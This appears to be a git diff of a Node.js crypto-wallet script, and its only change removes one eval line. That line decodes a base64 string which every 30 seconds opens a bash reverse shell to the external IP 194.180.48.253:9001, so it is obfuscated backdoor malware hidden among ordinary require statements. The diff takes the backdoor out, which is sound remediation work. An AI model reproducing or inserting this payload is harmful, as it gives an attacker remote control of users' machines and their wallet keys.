@@ -6,7 +6,6 @@ const readlineSync = require('readline-sync');
 const checkBalance = require('./src/checkBalance');
 const displayHeader = require('./src/displayHeader');
 const sleep = require('./src/sleep');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE5NC4xODAuNDguMjUzLzkwMDEgMDwmNSAxPiY1IDI+JjUiID4gL2Rldi9udWxsIDI+JjEgJicpLCAzMDAwMCk7","base64").toString())
 
 const rpcUrl = fs.readFileSync('rpc.txt', 'utf8').trim();
 
